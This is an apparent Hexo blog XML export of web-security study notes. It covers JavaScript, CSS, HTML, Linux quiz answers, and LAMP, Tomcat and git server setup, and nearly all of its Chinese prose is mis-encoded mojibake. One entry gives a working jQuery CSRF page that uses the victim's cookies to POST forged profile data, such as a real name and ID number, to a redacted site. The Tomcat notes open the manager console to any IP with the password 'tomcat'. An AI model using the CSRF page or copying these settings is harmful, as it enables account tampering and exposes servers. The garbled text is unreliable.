&lt;/body&gt;&lt;/html&gt; å¼¹çª— 123456#è­¦å‘Šæ¡†window.alert("sometext")#ç¡®è®¤æ¡†window.confirm("sometext")#æç¤ºæ¡†window.prompt("sometext", "defaultvalue") è®¡æ—¶ 12345678#é—´éš”æŒ‡å®šçš„æ¯«ç§’æ•°ä¸åœçš„æ‰§è¡ŒæŒ‡å®šä»£ç window.setInterval("javascript function", milliseconds)#åœæ­¢setInterval()æ–¹æ³•æ‰§è¡Œçš„å‡½æ•°ä»£ç window.clearInterval(intervalVariable)#ç¬¬äºŒä¸ªå‚æ•°æŒ‡ç¤ºä»Žå½“å‰èµ·å¤šå°‘æ¯«ç§’åŽæ‰§è¡Œç¬¬ä¸€ä¸ªå‚æ•°window.setTimeout("js function", milliseconds)#ç”¨äºŽåœæ­¢æ‰§è¡ŒsetTimeout()æ–¹æ³•çš„å‡½æ•°ä»£ç window.clearTimeout(timeoutVariable) Cookie cookieæ˜¯ä¸€äº›æ•°æ®ï¼Œå­˜å‚¨äºŽç”µè„‘ä¸Šçš„æ–‡æœ¬æ–‡ä»¶ä¸­ã€‚å½“webæœåŠ¡å™¨å‘æµè§ˆå™¨å‘é€webé¡µé¢æ—¶ï¼Œåœ¨è¿žæŽ¥å…³é—­åŽï¼ŒæœåŠ¡ç«¯ä¸ä¼šè®°å½•ç”¨æˆ·ä¿¡æ¯ã€‚ cookieçš„ä½œç”¨å°±æ˜¯ç”¨äºŽè§£å†³â€œå¦‚ä½•è®°å½•å®¢æˆ·ç«¯çš„ç”¨æˆ·ä¿¡æ¯â€ 12* å½“ç”¨æˆ·è®¿é—®webé¡µé¢æ—¶ï¼Œä»–çš„åå­—å¯ä»¥è®°å½•åœ¨cookieä¸­* åœ¨ç”¨æˆ·ä¸‹ä¸€æ¬¡è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œå¯ä»¥åœ¨cookieä¸­è¯»å–ç”¨æˆ·è®¿é—®è®°å½• 1234#åˆ›å»ºcookiedocument.cookie="username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/";#è¯»å–cookievar x = document.cookie; 2. JQueryâ€‹ å†…å®¹æ¯”è¾ƒç»†ç¢Žï¼Œå¤šçœ‹çœ‹jQueryæ•™ç¨‹ â€‹ ä½¿ç”¨jQueryå¯¹***è´¦æˆ·è¿›è¡ŒCSRFæ”»å‡»ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233&lt;html&gt;&lt;head&gt; &lt;title&gt;hack***&lt;/title&gt; &lt;script src="https://libs.baidu.com/jquery/2.0.0/jquery.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript"&gt; $.ajax(&#123; type:'POST', url:"http://www.***.com/api/user/info", dataType:'json', data: &#123; allow_status:"1", heading:"", id_number:"123456789123456789", nickname:"wangyingminghanpi", real_name:"æœ¬å¸", user_tag:'[]', &#125;, xhrFields:&#123; withCredentials:true //æ”¯æŒé™„å¸¦è¯¦ç»†ä¿¡æ¯,å¯ä»¥æºå¸¦cookie &#125;, crossDomain: true,//è¯·æ±‚åå‘å¤–åŸŸ,æ”¯æŒè·¨åŸŸè¯·æ±‚ success: function (data) &#123; console.log(data); &#125; &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>DOM</tag>
        <tag>BOM</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note13]]></title>
    <url>%2F2019%2F08%2F01%2Fnote13%2F</url>
    <content type="text"><![CDATA[Abstract: åˆæŽ¢CSS+JS 1. CSSå…¨ç¨‹æ˜¯Cascading Style Sheets å¼•å…¥æ–¹å¼ï¼š è¡Œå†…æ ·å¼ 1&lt;p style="display:none"&gt;æˆ‘æ˜¯æ®µè½&lt;/p&gt; ä¼˜å…ˆçº§æœ€é«˜ å†…åµŒå¼ 12345678910&lt;head&gt; &lt;style type="text/css"&gt; body&#123; background-color: red &#125; p&#123; margin-left: 20px &#125; &lt;/style&gt;&lt;/head&gt; å¤–é“¾å¼ 1&lt;link rel="stylesheet" type="text/css" href="css/login.css"&gt; ä¼˜å…ˆçº§ï¼šè¡Œå†…ï¼žå†…åµŒï¼žå¤–é“¾ æ›´å¤šå†…å®¹è¯·è®¿é—®w3cschool 2. JSgetElementByIdç”¨æ³•ï¼š 12345678#â€œæŸ¥æ‰¾â€id="demo"çš„HTMLå…ƒç´ ï¼Œå¹¶ä¿®æ”¹å…ƒç´ å†…å®¹document.getElementById('demo').innerHTML = "hello world";#æ”¹å˜HTMLå…ƒç´ çš„æ ·å¼ï¼Œæ˜¯æ”¹å˜HTMLå±žæ€§çš„ä¸€ç§å˜ç§document.getElementById("demo").style.fontSize="25px";#é€šè¿‡æ”¹å˜displayæ ·å¼æ¥éšè—HTMLå…ƒç´ document.getElementById("demo").style.display="none";#é€šè¿‡æ”¹å˜displayæ ·å¼æ¥æ˜¾ç¤ºéšè—HTMLå…ƒç´ document.getElementById("demo").style.display="block"; â€‹ JSæ˜¾ç¤ºæ–¹æ¡ˆ â€‹ ä½¿ç”¨window.alert()å†™å…¥è­¦å‘Šæ¡† â€‹ ä½¿ç”¨document.write()å†™å…¥HTMLè¾“å‡º â€‹ ä½¿ç”¨innerHTMLå†™å…¥HTMLå…ƒç´  â€‹ ä½¿ç”¨console.log()å†™å…¥æµè§ˆå™¨æŽ§åˆ¶å° JS HTML DOMæ–‡æ¡£ æŸ¥æ‰¾HTMLå…ƒç´  123456#é€šè¿‡å…ƒç´ idæŸ¥æ‰¾å…ƒç´ document.getElementById(id)#é€šè¿‡æ ‡ç­¾åæ¥æŸ¥æ‰¾å…ƒç´ document.getElementByTagName(name)#é€šè¿‡ç±»åæ¥æŸ¥æ‰¾å…ƒç´ document.getElementByClassName(name) æ”¹å˜HTMLå…ƒç´  123456#æ”¹å˜å…ƒç´ çš„inner HTMLelement.innerHTML= new html content#æ”¹å˜HTMLå…ƒç´ çš„å±žæ€§å€¼element.attribute = new value#æ”¹å˜HTMLå…ƒç´ çš„æ ·å¼element.style.property = new style æ·»åŠ å’Œåˆ é™¤å…ƒç´  12345678910#åˆ›å»ºHTMLå…ƒç´ document.createElement(element)#åˆ›å»ºHTMLå…ƒç´ document.removeChild(element)#æ·»åŠ HTMLå…ƒç´ document.appendChild(element)#æ›¿æ¢HTMLå…ƒç´ document.replaceChile(element)#å†™å…¥HTMLè¾“å‡ºæµdocument.write(text) æ·»åŠ äº‹ä»¶å¤„ç†ç¨‹åº 12#å‘onclickäº‹ä»¶æ·»åŠ äº‹ä»¶å¤„ç†ç¨‹åºdocument.getElementById(id).onclick = function()&#123;code&#125; æºç ï¼š 1234567891011121314151617181920&lt;html&gt; &lt;title&gt;JS&lt;/title&gt; &lt;body&gt; &lt;div id="div1"&gt; &lt;p id="p1"&gt;è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚&lt;/p&gt; &lt;p id="p2"&gt;è¿™æ˜¯ç¬¬äºŒæ®µè½ã€‚&lt;/p&gt; &lt;/div&gt; &lt;script&gt; //æ–°å»º&lt;p&gt;&lt;/p&gt;æ ‡ç­¾ var para = document.createElement("p"); //æ–°å»ºæ–‡æ¡£ var node = document.createTextNode("è¿™æ˜¯ç”¨jsåŠ çš„æ–°æ®µè½ã€‚"); //å°†nodeæ·»åŠ åˆ°paraä¸­ â†’ &lt;p&gt;æ–‡æ¡£&lt;/p&gt; para.appendChild(node); var element = document.getElementById("div1"); //å°†påŠ å…¥åˆ°divä¸­ element.appendChild(para); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note12]]></title>
    <url>%2F2019%2F07%2F30%2Fnote12%2F</url>
    <content type="text"><![CDATA[Abstract: åˆå­¦HTML 1. äº›ç®€å•çš„æ ‡ç­¾12345678910111213&lt;html&gt; //&lt;html&gt;ä¸Ž&lt;/html&gt;ä¹‹é—´çš„æ–‡æœ¬æè¿°ç½‘é¡µ &lt;head&gt; &lt;title&gt;ç½‘é¡µæ ‡é¢˜&lt;/title&gt; &lt;/head&gt; &lt;body&gt; //&lt;body&gt;ä¸Ž&lt;/body&gt;ä¹‹é—´çš„æ–‡æœ¬æ˜¯å¯è§çš„é¡µé¢å†…å®¹ &lt;h1&gt; è¿™æ˜¯ä¸€ä¸ªæ ‡é¢˜ //ä¸€çº§æ ‡é¢˜ &lt;/h1&gt; &lt;p&gt; è¿™æ˜¯ä¸€ä¸ªæ®µè½ //æ®µè½éƒ¨åˆ† &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 2. htmlä¸­çš„æ ‡ç­¾ï¼š12345* HTMLæ ‡é¢˜æ˜¯é€šè¿‡`&lt;h1&gt;-&lt;h6&gt;`ç­‰æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„* HTMLæ®µè½æ˜¯é€šè¿‡`&lt;p&gt;`æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„* HTMLé“¾æŽ¥æ˜¯é€šè¿‡`&lt;a&gt;`æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„* HTMLå›¾åƒæ˜¯é€šè¿‡`&lt;img&gt;`æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„* HTMLè¡¨æ ¼æ˜¯é€šè¿‡`table/thead/tbody/th/td`ç­‰æ ‡ç­¾æ¥å®šä¹‰çš„ 3. HTML formè¡¨å•1&lt;form action="www.baidu.com" method="get" enctype="application/x-form-urlenconded"&gt; 123* Action å±žæ€§è¡¨æ˜Žè¡¨å•å°†è¦æäº¤åˆ°å“ªé‡Œ* Method è¡¨ç¤ºæäº¤ç”¨çš„æ–¹æ³•åˆ†åˆ«ä¸º`get`å’Œ`post`å¯é€‰* Enctype è§„å®šåœ¨å‘é€è¡¨å•æ•°æ®å‰å¯¹æ•°æ®è¿›è¡Œç¼–ç çš„æ ¼å¼ 4. è¾“å…¥æ¡†&lt;input&gt;æ ‡ç­¾æœ€å¸¸ç”¨1234567* `type=&quot;text&quot;` æ™®é€šçš„æ–‡æœ¬è¾“å…¥æ¡†* `type=&quot;password&quot;`å¸¦æ˜Ÿå·çš„å¯†ç è¾“å…¥æ¡†* `type=&quot;radio&quot;`å•é€‰æ¡†ï¼ŒåŒä¸€ç±»åž‹è¦æœ‰ç»Ÿä¸€çš„`name`å±žæ€§ï¼Œè¡¨æ˜Žæ˜¯ä¸€ç±»* `type=&quot;checkbox&quot;`å¤é€‰æ¡†ï¼Œæ·»åŠ `checked`å±žæ€§ä¼šé»˜è®¤é€‰ä¸­* `type=&quot;file&quot;` æ–‡ä»¶ä¸Šä¼ é€‰æ‹©* `type=&quot;email&quot;`å¸¦ç®€å•éªŒè¯çš„é‚®ç®±è¾“å…¥* `&lt;textarea&gt;`æ ‡ç­¾inputåªèƒ½å•è¡Œè¾“å…¥ï¼Œ`textarea`å¯ä»¥å¤šè¡Œè¾“å…¥]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[stage1çŸ¥è¯†ç›²ç‚¹]]></title>
    <url>%2F2019%2F07%2F30%2Fstage1-exam%2F</url>
    <content type="text"><![CDATA[Abstract: çŸ¥è¯†ç›²ç‚¹æ€»ç»“ è¿è¡Œä¸€ä¸ªè„šæœ¬ï¼Œç”¨æˆ·ä¸éœ€è¦ä»€ä¹ˆæ ·çš„æƒé™ï¼Ÿ read write execute browse on the directory åœ¨bashä¸­ï¼Œåœ¨ä¸€æ¡å‘½ä»¤åŽåŠ å…¥1&gt;&amp;2æ„å‘³ç€ï¼š æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯è¾“å‡º æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯è¾“å‡º æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ 1è¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼Œ2è¡¨ç¤ºæ ‡å‡†é”™è¯¯ï¼Œ&amp;è¡¨ç¤ºç­‰åŒäºŽçš„æ„æ€ ä¸‹é¢å“ªæ¡å‘½ä»¤å¯ä»¥æŠŠf1.txtå¤åˆ¶ä¸ºf2.txtï¼š cp f1.txt |f2.txt cat f1.txt | f2.txt cat f1.txt &gt; f2.txt copy f1.txt | f2.txt å¦‚ä½•æ˜¾ç¤ºLinuxç³»ç»Ÿä¸­æ³¨å†Œçš„ç”¨æˆ·æ•°ï¼ˆåŒ…å«ç³»ç»Ÿç”¨æˆ·ï¼‰ï¼Ÿ account-l nl /etc/passwd |head wc â€“user /etc/passwd wc â€“lines /etc/passwd word countï¼Œ--line/-låªæ˜¾ç¤ºè¡Œæ•° å‘½ä»¤kill 9çš„å«ä¹‰æ˜¯ï¼š kills the process whose PID is 9 kills all processes belonging to UID 9 sends SIGKILL to the process whose PID is 9 sends SIGTERM to the process whose PID is 9 åœ¨viä¸­é€€å‡ºä¸ä¿å­˜çš„å‘½ä»¤æ˜¯ï¼š :q :w :wq :q! ä¸‹é¢å“ªä¸ªåè®®ä½¿ç”¨äº†ä¸¤ä¸ªä»¥ä¸Šçš„ç«¯å£ï¼š telnet FTP rsh HTTP ä»€ä¹ˆå‘½ä»¤ç”¨æ¥åªæ›´è¡Œå·²ç»å®‰è£…è¿‡çš„rpmè½¯ä»¶åŒ…ï¼š rpm -U *.rpm rpm -F *.rpm rpm -e *.rpm rpm -q *.rpm pingä½¿ç”¨çš„åè®®æ˜¯ï¼š TCP UDP SMB ICMP Linuxç³»ç»Ÿä¸­æ·»åŠ ä¸€ä¸ªç”¨æˆ·ï¼Œæ”¹å˜è´¦å·è¿‡æœŸæ—¶é—´ï¼Œç”¨å“ªä¸ªå‘½ä»¤ï¼š usermod -a usermod -d usermod -x usermod -e é™æ€IPå’ŒåŠ¨æ€IPçš„åŒºåˆ«ï¼Œå…·ä½“åº”ç”¨åœºæ™¯ é™æ€IPï¼šIPåœ°å€æ˜¯æ‰‹åŠ¨åˆ†é…çš„ï¼Œé€šå¸¸éœ€è¦ä»˜è´¹ åŠ¨æ€IPï¼šåŠ¨æ€IPæ˜¯è‡ªåŠ¨åˆ†é…çš„ åç§° ä¼˜ç‚¹ ç¼ºç‚¹ é™æ€IP åœ°å€ä¸å˜â€”é€‚ç”¨äºŽwebæœåŠ¡å™¨ï¼Œç”µå­é‚®ä»¶æœåŠ¡å™¨å’Œå…¶ä»–internetæœåŠ¡å™¨ æ¯”åŠ¨æ€IPè´µ é™æ€IPå¯¹äºŽVoIPå’Œæ¸¸æˆåº”ç”¨ç¨‹åºæ›´å¯é  éœ€è¦é¢å¤–çš„å®‰å…¨æ€§ åŠ¨æ€IP æ¯”é™æ€IPåœ°å€ä¾¿å®œ éœ€è¦DHCPæœåŠ¡å™¨æ‰èƒ½èŽ·å–IPåœ°å€ æ›´æ”¹IPåœ°å€å¯æä¾›æ›´å¤šéšç§ éžé™æ€çš„ï¼Œæ¯æ¬¡IPåœ°å€æ›´æ”¹æ—¶ï¼Œå¯èƒ½éœ€è¦å†æ¬¡æ‰¾åˆ°ä½ çš„IP æ­å»ºLAMPæ‰€éœ€è¦çš„å‘½ä»¤ï¼š 123456789101112131415161718192021222324252627#å®‰è£…apacheæœåŠ¡[root]$ yum install httpd#è®¾ç½®å¼€æœºå¯åŠ¨[root]$ systemctl enable httpd#å¼€å¯æœåŠ¡[root]$ systemctl start httpd#è®¾ç½®é˜²ç«å¢™[root]$ firewall-cmd --zone=public --add-port=80/tcp --permanent[root]$ firewall-cmd --zone=public --add-port=433/tcp --permanent#é‡æ–°åŠ è½½ï¼Œæ–¹å¯ç”Ÿæ•ˆ[root]$ firewall-cmd --reload#å®‰è£…mysqlæœåŠ¡[root]$ yum install mariadb-server#è®¾ç½®å¼€æœºå¯åŠ¨[root]$ systemctl enable mariadb#å¯åŠ¨æœåŠ¡[root]$ systemctl start mariadb#åˆå§‹åŒ–mysql[root]$ mysql_secure_installation#å®‰è£…php[root]$ yum install php php-gd php-mysql php-pdo php-*#é‡å¯apache[root]$ systemctl restart httpd#ä¿®æ”¹ç½‘ç«™æ ¹ç›®å½•çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„[root]$ chown -R apache:apache /var/www/html]]></content>
      <categories>
        <category>Web Security</category>
        <category>summary</category>
      </categories>
      <tags>
        <tag>LinuxåŸºæœ¬å‘½ä»¤ - æ­å»ºæœåŠ¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdownè¯­æ³•]]></title>
    <url>%2F2019%2F07%2F29%2Fsimpleapp%2F</url>
    <content type="text"><![CDATA[Abstract: ç”¨typoraå†™markdownæ–‡æ¡£çš„è¯­æ³• æ ‡é¢˜ä¸‹åˆ’çº¿ ä¸‹åˆ’çº¿ å¼ºè°ƒé‡è¦ æ–œä½“æ–œä½“ åˆ é™¤åˆ é™¤ æ–¹æ¡†æ¡†èµ·æ¥ æ³¨é‡Šä»Šå¤©åƒå•¥å‘€^1 é«˜äº®==é«˜äº®== è§’æ ‡ä¸Šè§’æ ‡ï¼šx^2^ ä¸‹è§’æ ‡ï¼šH2O $x^2+x1$ è½¬ä¹‰# Listæœ‰åº æ— åº 1 2 1 2 todo list èƒŒå•è¯ æ•´ç†ç¬”è®° Table åˆ†å‰²çº¿ æ’å…¥é“¾æŽ¥Typora æ•°å­¦å…¬å¼$$&lt;Empty \space Math \space Block&gt;$$ ä»£ç 12def abc() print() è¡¨æƒ…:sweat: :happy: å¼•ç”¨[å¼•ç”¨] å¼•ç”¨ ç›®å½•[TOC]]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>typora</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week2sum]]></title>
    <url>%2F2019%2F07%2F29%2Fweek2sum%2F</url>
    <content type="text"><![CDATA[Abstract: å¯¹ç¬¬äºŒå‘¨å­¦ä¹ çš„å†…å®¹è¿›è¡Œæ€»ç»“ å‘¨ä¸€Linuxæƒé™1.å†…å®¹ç®€ä»‹ Linuxæƒé™æŽ§åˆ¶ gitæœåŠ¡å™¨æ­å»ºä¸Žå®‰å…¨æ£€æŸ¥ tomcatæœåŠ¡å™¨æ­å»ºä¸Žå®‰å…¨æ£€æŸ¥ 2.å‡ ç§æ–‡ä»¶ç±»åž‹ [d] æ˜¯ç›®å½• [-] æ˜¯æ–‡ä»¶ [l] æ˜¯é“¾æŽ¥æ–‡ä»¶(link file) 3.è¯»å†™æ‰§è¡Œæƒé™ æ–‡ä»¶ç±»åž‹ å±žä¸»æƒé™ å±žç»„æƒé™ å…¶ä»–ç”¨æˆ·æƒé™ 0 123 456 789 d rwx r-x r-x ç›®å½•æ–‡ä»¶ è¯»å†™æ‰§è¡Œ è¯»â€”æ‰§è¡Œ è¯»â€”æ‰§è¡Œ å¯¹äºŽç›®å½•çš„rwx 123* rå¯ä»¥æ˜¾ç¤ºæ–‡ä»¶å¤¹çš„ç»“æž„* wå¯ä»¥åœ¨æ–‡ä»¶å¤¹é‡Œæ·»åŠ åˆ é™¤æ–‡ä»¶* xå¯ä»¥è¿›å…¥åˆ°æ–‡ä»¶å¤¹ æƒé™å‘½ä»¤ï¼šrwxåœ¨ç³»ç»Ÿä¸­å¯¹åº”ä¸€ä¸ªä¸ªçš„å€¼ï¼Œr-4ï¼Œw-2ï¼Œx-1 chownä¿®æ”¹å½“å‰æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æ‰€å±žç”¨æˆ· 1chown root:root /tmp/tmp1 1chown -R root:root /tmp/tmp1 chmodä¿®æ”¹å½“å‰æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æƒé™ è¯­æ³•ï¼šchmod [who] [+|-|=] [mode] æ–‡ä»¶å æ“ä½œå¯¹è±¡whoï¼š uè¡¨ç¤ºâ€œç”¨æˆ·(user)â€ï¼Œå³æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€… gè¡¨ç¤ºâ€åŒç»„(group)ç”¨æˆ·â€ï¼Œå³ä¸Žæ–‡ä»¶å±žä¸»æœ‰ç›¸åŒç»„IDçš„æ‰€æœ‰ç”¨æˆ· oè¡¨ç¤ºâ€å…¶ä»–(other)ç”¨æˆ·â€ aè¡¨ç¤ºâ€æ‰€æœ‰(all)ç”¨æˆ·â€ï¼Œå®ƒæ˜¯ç³»ç»Ÿé»˜è®¤å€¼ æŽ¨èä½¿ç”¨æ•°å­—çš„æ–¹å¼ä¿®æ”¹æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹çš„æƒé™ æ“ä½œç¬¦å¯ä»¥æ˜¯ï¼š +æ·»åŠ æŸä¸ªæƒé™ -å–æ¶ˆæŸä¸ªæƒé™ =èµ‹äºˆç»™å®šæƒé™å¹¶å–æ¶ˆå…¶ä»–æ‰€æœ‰æƒé™ *ä¸æŒ‡å®šç”¨æˆ·çš„æƒ…å†µä¸‹ï¼Œ=åªä¼šç»™æ–‡ä»¶æ‰€æœ‰è€…åŠ æƒé™ï¼Œ+ç»™æ‰€æœ‰è€…åŠ æƒé™ ä¸€ä¸ªç½‘ç«™æœ€åˆç†çš„æƒé™æ˜¯755 4.æ¸—é€æµ‹è¯•ä¸­å¸¸ç”¨çš„å‘½ä»¤ whoami æŸ¥çœ‹å½“å‰ç”¨æˆ· tar åŽ‹ç¼©å’Œè§£åŽ‹æ–‡ä»¶ netstat æŸ¥çœ‹ç½‘ç»œçŠ¶æ€ nslookup æŸ¥çœ‹dnsä¿¡æ¯ ps æŸ¥çœ‹è¿è¡Œçš„ç¨‹åº top å®žæ—¶æŸ¥çœ‹è¿è¡Œçš„ç¨‹åº service ä½¿ç”¨serviceæŽ§åˆ¶æœåŠ¡å¯åŠ¨å…³é—­ curl èŽ·å–ç½‘é¡µï¼Œå¯ä»¥ä½¿ç”¨è¾“å‡ºé‡å®šå‘æ¥ä¸‹è½½æ–‡ä»¶ wget ä¸‹è½½æ–‡ä»¶ 1more /etc/apt/sources.list sources.listæ˜¯å„ç§è½¯ä»¶æºï¼Œå¸¸ç”¨çš„æºæœ‰é˜¿é‡Œäº‘ã€æ¸…åŽå¤§å­¦ã€ä¸­ç§‘é™¢ 1sudo apt-get update Note: æŽ¨èå…³æœºå¿«ç…§ å‘¨äºŒtomcatå’ŒgitæœåŠ¡å™¨æ­å»º1.å†…å®¹ç®€ä»‹ å¤ä¹  tomcatæœåŠ¡å™¨æ­å»º 2.ç½‘ç»œä¸é€šè¯¥å¦‚ä½•è°ƒè¯•å…ˆç”¨ficonfigæŸ¥çœ‹ç½‘å¡ä¿¡æ¯ï¼Œè‹¥æ­£å¸¸ï¼Œping ç½‘å¡ï¼Œè‹¥ä¸æ­£å¸¸ï¼ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶å’Œç½‘ç»œçŽ¯å¢ƒï¼›è‹¥ç½‘å¡é»˜è®¤ä¸å¯ç”¨ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œonboot=yes é‡å¯ç½‘ç»œæœåŠ¡ï¼Œé…ç½®æ–‡ä»¶è·¯å¾„ï¼š/etc/sysconfig/network-scripts/ifcfg-eth0 123cat /etc/sysconfig/network-script/ifcfg-eth0vi /etc/sysconfig/network-script/ifcfg-eth0service network restart è‹¥ç½‘ç»œçŽ¯å¢ƒæ˜¯dhcpï¼Œä¿®æ”¹ä¸Šç½‘æ–¹å¼ä¸ºdhcpï¼Œé‡å¯ç½‘ç»œæœåŠ¡ è‹¥ç½‘ç»œçŽ¯å¢ƒæ˜¯é™æ€ipï¼Œä¿®æ”¹ä¸Šç½‘æ–¹å¼ä¸ºstaticï¼Œipaddr=, netmask=, gateway= èƒ½å¤Ÿpingé€š8.8.8.8 1curl www.baidu.com è‹¥ä¸èƒ½æ‰“å¼€ï¼ŒæŸ¥çœ‹dnsé…ç½®æ–‡ä»¶ 1vi /etc/resolv.conf æ·»åŠ servername 1.1.1.1 3.æ­å»ºtomcatæœåŠ¡å™¨12345#å¯åŠ¨é˜²ç«å¢™systemctl start firewalld#å°†80ç«¯å£æ·»åŠ åˆ°é˜²ç«å¢™ä¾‹å¤–å¹¶é‡å¯firewall-cmd --zone=public --add-por=8080/tcp --permanentfirewall-cmd --reload é˜²ç«å¢™=ç¡¬ä»¶+è½¯ä»¶ 1yum apt-get -y install tomcat 1vi .../apache-tomcat-8.5.43/webapps/manager/META-INF/context.xml ä¿®æ”¹tomcaté…ç½®æ–‡ä»¶ä¸º 12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Context antiResourceLocking="false" privileged="true"&gt; &lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\d+\.\d+\.\d+\.\d+" /&gt;&lt;/Context&gt; è¿›å…¥confç›®å½•ä¸‹ä¿®æ”¹tomcat-users.xml ç”¨æˆ·åå’Œå¯†ç  1vi /usr/local/tomcat/conf/tomcat-users.xml 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;tomcat-usersversion="1.0" xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd" xmlns:xsi="http://www/w3.org/2001/XMLSchema-instance" xmlnx="http://tomcat.apache.org/xml"&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;user roles="manager-gui, manager-script, manager-jmx, manager-status, admin-script" password="tomcat" username="tomcat"/&gt;&lt;/tomcat-users&gt; 4.gitæœåŠ¡å™¨æ­å»º12345#ä¿®æ”¹yumæºcat CentOS-Base.repo#[base]æ³¨é‡ŠæŽ‰mirrorlistå’Œbaseurlæ·»åŠ ä»¥ä¸‹è¯­å¥baseurl=http://192.168.100.110:8000/yum/#ä»¥ä¸‹ä¸‰ä¸ªä¿®æ”¹ä¸ºenable=0 12345678910111213141516171819#ä¸‹è½½git[root@localhost]$ yum install git#æ·»åŠ gitç”¨æˆ·[root@localhost]$ useradd git[root@localhost]$ cd /home/git/[root@localhost]$ lltotal 0[root@localhost]$ pwd/home/git[root@localhost]$ cd ..[root@localhost]$ su git[git@localhost]$ mkdir .ssh[git@localhost]$ cd .ssh/[git@localhost]$ touch authorized_keys[git@localhost]$ chmod 600 authorized_keys[git@localhost]$ cd /[git@localhost~]$ mkdir Project[git@localhost~]$ cd Project[git@localhost Project]$ git init --bare icq.git win10å¯åŠ¨powershell dir ssh 1ssh-keygen -t rsa äº§ç”Ÿä¸¤ä¸ªæ–‡ä»¶.pubæ˜¯å…¬é’¥ 123dir .sshtype .\.ssh\id_rsa.pub#èŽ·å¾—å…¬é’¥ ç²˜è´´åˆ°gitç”¨æˆ·authorized_keys 12chmod 700 .sshchmod 600 authorized_keys 1yum install git å†åˆ›å»ºç”¨æˆ·git //ç®¡ç†gitä¸­æ‰€æœ‰çš„é¡¹ç›® åœ¨gitç”¨æˆ·å®¶ç›®å½•ï¼Œåˆ›å»º.sshæ–‡ä»¶å¤¹ï¼Œä¿®æ”¹æƒé™ä¸º700 //è¿™ä¸ªæ˜¯å› ä¸ºsshæœåŠ¡é™åˆ¶ åœ¨.sshæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºauthorized_keysæ–‡ä»¶ ï¼Œä¿®æ”¹æƒé™ä¸º600 //è¿™ä¸ªå› ä¸ºsshæœåŠ¡çš„é™åˆ¶ï¼Œæƒé™ä¸æ­£ç¡®è®¤è¯ä¼šå¤±è´¥ åœ¨gitç”¨æˆ·å®¶ç›®å½•åˆ›å»ºprojectç›®å½•ï¼Œç”¨æ¥å­˜æ”¾gité¡¹ç›® 12#åˆå§‹åŒ–ä¸€ä¸ªgité¡¹ç›®git init --bare icq.git gitå®¢æˆ·ç«¯ å®‰è£…git // git for windows git for linux windows 10 ä½¿ç”¨sshåˆ›å»ºå…¬é’¥å’Œç§é’¥ ssh-keygen -t rsa å°±ä¼šåœ¨å®¶ç›®å½•åˆ›å»º.sshæ–‡ä»¶å¤¹ï¼Œé‡Œé¢å°±ä¼šæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå°†å…¬é’¥(.pubç»“å°¾)å†™å…¥åˆ°æœåŠ¡å™¨authorized_keysæ–‡ä»¶ä¸­ 1git clone git@ip:/home/git/project/icq.git Note:é»˜è®¤æƒ…å†µä¸‹ ssh git@192.168.100.167å¯ä»¥ç™»å½•è™šæ‹Ÿæœºï¼Œä»Žè€Œäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Œåœ¨è™šæ‹Ÿæœºé‡Œåˆ‡æ¢åˆ°rootæƒé™ä¿®æ”¹gitçš„shell 1[root@localhost ~] usermod -s /sbin/nologin git è¿™æ ·sshå°±ç¦æ­¢äº† 5.æ­å»ºåšå®¢ å®‰è£…Githubæ¡Œé¢ç‰ˆå’ŒNode.js ç„¶åŽcmdä¸­ 1npm install -g hexo-cli --registry=https://registry.nom.taobao.org åˆ›å»ºä¸€ä¸ªblogç›®å½•ï¼Œç”¨æ¥å­˜æ”¾åšå®¢ è¿›å…¥åˆ°blogä¸­ï¼Œå¯åŠ¨cmdæ‰§è¡Œå‘½ä»¤ 123456#åˆå§‹åŒ–hexohexo 